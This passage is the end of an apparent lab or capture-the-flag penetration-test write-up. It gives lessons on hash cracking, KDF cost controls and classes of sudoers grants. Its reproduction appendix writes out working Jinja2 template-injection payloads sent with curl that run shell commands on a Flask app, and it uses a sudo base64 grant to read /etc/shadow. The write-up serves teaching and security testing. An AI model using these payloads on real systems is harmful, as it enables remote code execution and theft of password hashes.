* **`su - verde` around the app is the correct choice** and the report should say so. A Flask app on port 8089 with `render_template_string` that ran as root would make the whole exercise trivial. The `uid=1000` is what makes F2 reachable and F1 bounded.
* **The `base64` grant is a good, quiet test of the grant-naming-an-interpreter doctrine**, precisely because a reader will classify it as RCE on sight. Its actual class — *read, not write* — is only visible in `base64 --help`, and the difference is a full severity grade.

---

## 10. What generalises

1. **A broken hash is not a finding; the weakness that made it attackable is.** Both hashes here are at distribution-default cost. The finding is the sudoers line.
2. **Read the KDF's cost, do not read its parameters — and get the baseline by building a control, not by opening a document.**
3. **A crack that returns an account you already own is worth zero reach, and the report must say zero.** The number to publish is *candidates / seconds / rate / and what it bought*.
4. **The positive control of a cracker is "it recovers a hash whose plaintext you had", and its failure looks exactly like a strong passphrase.** State the postcondition as a **count identity**, never a boolean.
5. **The control must live inside the instrument.** A control run once by hand is a memory, and the wiring is where the failure is.
6. **An implausible rate is a failed control.** An offline verifier fails silently and instantly; 10,705 KDFs/second means the KDF never ran.
7. **A third class of sudoers grant exists: argument-taking, no output-file option → confidentiality, not RCE.** Both existing classes are RCE, so the taxonomy needs this one.
8. **Measure the write's identity, not the write's success.** A redirect through `sudo` succeeds and is still unprivileged.

---

## 11. Appendix — reproduction

```bash
# 1. surface
nmap -sV -Pn -p- 172.17.0.20

# 2. SSTI, identity first
curl -s -G http://172.17.0.20:8089/ --data-urlencode 'user={{7*7}}'
curl -s -G http://172.17.0.20:8089/ --data-urlencode \
  "user={{ cycler.__init__.__globals__.os.popen('id').read() }}"

# 3. the grant, and what class of primitive it is
curl -s -G http://172.17.0.20:8089/ --data-urlencode "user={{ cycler.__init__.__globals__.os.popen('sudo -n -l').read() }}"
curl -s -G http://172.17.0.20:8089/ --data-urlencode "user={{ cycler.__init__.__globals__.os.popen('sudo -n /usr/bin/base64 --help').read() }}"

# 4. hashes
curl -s -G http://172.17.0.20:8089/ --data-urlencode \
  "user={{ cycler.__init__.__globals__.os.popen('sudo -n /usr/bin/base64 -w0 /etc/shadow').read() }}"

# 5. the two control keys the oracle was validated against
ssh-keygen -t rsa -b 2048 -N 'KnownPass1'    -C ctl1 -f ctl1 -q
ssh-keygen -t rsa -b 2048 -N 'AnotherUser99' -C ctl2 -f ctl2 -q
```
